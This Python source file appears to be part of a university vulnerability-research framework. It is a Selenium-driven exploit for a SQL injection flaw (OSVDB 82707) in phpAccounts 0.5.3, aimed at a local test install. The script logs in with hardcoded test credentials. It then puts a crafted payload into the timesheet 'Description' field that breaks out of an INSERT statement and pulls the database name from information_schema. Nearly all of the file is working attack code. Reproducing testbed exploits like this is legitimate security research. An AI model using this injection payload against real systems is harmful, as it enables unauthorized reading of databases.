
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import framework                        
import time
import selenium.common.exceptions
from datetime import date

class Exploit (framework.Exploit):
    attributes = {'Name' : "OSVDB_82707C",                        
                  'Description' : "PHP injection vulnerability in 'New Timesheet' action.",
                  'References' : [['OSVDB','82707'],['http://www.osvdb.org/show/osvdb/82707']],
                  'Target' : "phpAccounts 0.5.3",
                  'TargetLicense' : '',
                  'Type' : "SQL",
                  'VulWikiPage' : "",
                  'Privileged' : True
                  }

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        self.verified = False
        return

    def setup(self, target_system_dir):
 
        driver = self.create_selenium_driver()
        driver.get("http://127.0.0.1/phpaccounts/index.php")

        driver.get_element(by_xpath="//input[@name='Login_Username']").send_keys("phpaccounts@umd.edu")
        driver.get_element(by_xpath="//input[@name='Login_Password']").send_keys("phpaccountspw21")
        driver.get_element(by_xpath="//input[@value='Login']").click()
        driver.get_element(by_xpath="//frame[@name='leftFrame']")
        driver.get("http://127.0.0.1/phpaccounts/index.php?page=clients&action=new_client")

        driver.get_element(by_xpath="//input[@value='Submit']").click()
        driver.get_element(by_xpath="//td[contains(text(),'security')]")
        driver.cleanup()

        return
        
        

    def exploit(self):
        driver = self.create_selenium_driver()
        driver.get("http://127.0.0.1/phpaccounts/index.php")

        driver.get_element(by_xpath="//input[@name='Login_Username']").send_keys("phpaccounts@umd.edu")
        driver.get_element(by_xpath="//input[@name='Login_Password']").send_keys("phpaccountspw21")
        driver.get_element(by_xpath="//input[@value='Login']").click()
        driver.get_element(by_xpath="//frame[@name='leftFrame']")

        driver.get("http://127.0.0.1/phpaccounts/index.php?page=clients&action=new&Submit=timesheet")
        driver.get_element(by_xpath="//input[@value='Go']").click()

        dateval = date.today().strftime("%Y%m%d110000")
        driver.get_element(by_xpath="//input[@name='Description']").send_keys("desc','43','%s','0:0:00'),(19,'1',(select schema_name from information_schema.schemata order by schema_name desc limit 1),'101','%s','0:0:00'),(14,'1','desc2" % (dateval, dateval))
        driver.get_element(by_xpath="//input[@name='Value']").send_keys("600") 
        driver.get_element(by_xpath="//input[@value='Submit']").click()

        try:
            dbname = driver.get_element(by_xpath="/html/body/div[2]/table/tbody/tr[4]/td[5]").text
            self.logger.info("Extracted database name %s", dbname)
            self.verified = True
        except selenium.common.exceptions.NoSuchElementException:
            self.logger.error("Failed to extract database name")


        driver.cleanup()
        return                

    def verify(self):
        return self.verified
